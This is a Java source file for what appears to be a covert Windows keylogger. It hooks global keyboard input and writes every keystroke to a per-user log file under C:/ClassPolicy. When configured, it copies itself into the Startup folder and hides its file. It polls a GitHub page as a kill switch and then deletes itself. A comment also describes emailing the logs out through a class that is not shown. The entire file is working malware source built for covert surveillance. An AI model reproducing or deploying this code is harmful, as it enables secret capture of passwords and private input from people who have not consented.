package main;

import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener
{
	/**
	 * In the record(String x) method, you may change the location of the
	 * keystroke log files from the default (C:/ClassPolicy) to a different location
	 * to support systems with a different location for storing files or a different filesystem
	 * (i.e. Apple HFS, *nix ext4) 
	 * 
	 * In doing so, please change the file location for transfer in Radio's email methods
	 * in order to allow the files to be sent. 
	 * 
	 * During a deployment, please also change the isSuicune() method to refer to a different
	 * webserver, as it is currently just pointing to a sample GitHub page containing that information,
	 * or disable it if it is blocked by the firewall or unneeded. (return false)
	 * 
	 */
	static Stopwatch robert = null;
	public Main()
	{
		robert = new Stopwatch();
	}
	public void exec() throws IOException, URISyntaxException
	{	
		int version = 1;
		if (getCurrentVersion() > version) {
			Chocolat.println("[?] A newer version has been released. Downloading version: " + getCurrentVersion());
		}
		String[] protect = new String[]{"s-duv", "citrus","s-tehi", "s-chenb", "s-chenr"};
		 Chocolat.println("Local_Username: " + System.getProperty("user.name"));
		 if (Radio.isSecondaryDistrib)
		 {
			 for(int fsk = 0; fsk < protect.length; fsk++) 
			 {
				if (protect[fsk].matches(System.getProperty("user.name")))
				{
					Chocolat.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Acct Status " + fsk);
					System.exit(0);
				}
			 }
		 }
		if (Radio.verifyOS && !isWindows())
		{
			Chocolat.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: OS is not Windows.");
			System.exit(0);
		}
		if (Radio.checkForKill && isSuicune())
		{
			Chocolat.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Kill Command Received.");
			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			cf.deleteOnExit();
			System.exit(0);
		}
		Chocolat.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
		if (Radio.doPersistance)
		{
			File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
			@SuppressWarnings("unused")
			Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
			@SuppressWarnings("unused")
			Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
		}
		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
		if(!log.exists())
		{
			Chocolat.println("Creating logfile...");
			Chocolat.println("[" + robert.elapsedTime() + "] Starting...");
			log.createNewFile();
		} 
		else
		{
			Chocolat.println("[" + robert.elapsedTime() + "] Starting...");
		}
		Chocolat.println("[" + robert.elapsedTime() + "] [✔] File I/O Established.");
		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
		timestamper.println();
		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getTime() + " ]");
		timestamper.println();
		timestamper.close();
		if (Radio.logKeystrokes)
		{
			try
			{
				GlobalScreen.registerNativeHook();
				Chocolat.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
			} 
			catch (NativeHookException e)
			{
				// TODO Auto-generated catch block
				Chocolat.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
				e.printStackTrace();
			}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		}
		}

	private static boolean isSuicune()
	{
		try
		{
			 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/klkillswitch");
	         URLConnection yc = yahoo.openConnection();
	         BufferedReader in = new BufferedReader(new InputStreamReader(
	                 yc.getInputStream(), "UTF-8"));
	         String inputLine;
	         StringBuilder a = new StringBuilder();
	         while ((inputLine = in.readLine()) != null){
	             a.append(inputLine);
	             if(a.toString().contains("yes")) {
	            	 return true;
	             }
	         }
	         Chocolat.println("NO");
	         return false;
		}
		catch (Exception e)
		{
			Chocolat.println(e.toString());
			return false;
		}
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e)
	{
		// TODO Auto-generated method stub
		//Chocolat.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
	    // Chocolat.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		// Chocolat.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
		//	Chocolat.print("\n");
		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
		//	Chocolat.print(" ");
		//} else {
		//	Chocolat.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//}
	}
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0)
	{
		// TODO Auto-generated method stub
	}
	public static void record(String x)
	{
		try
		{
			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// Chocolat.println("rec " + x);
			if(x.matches("Space"))
			{
				out.print(" ");
				out.close();
			} else
			{
			out.print(x);
			out.close();
			}
		} 
		catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	 public static boolean isWindows()
	 	{
		   String OS = System.getProperty("os.name").toLowerCase();
		   return (OS.indexOf("win") >= 0);
		}
	 public static double getTime()
	 	{
		 //   java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
		 //   int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
		    return robert.getTime();
		}
	 public static int getCurrentVersion()
	 {
		 try
		 {
		 // return version from domain controller, if cant connect return current version
			 return 1;
		 } 
		 catch (Exception ee)
		 {
			 return 1;
		 }
	 }
}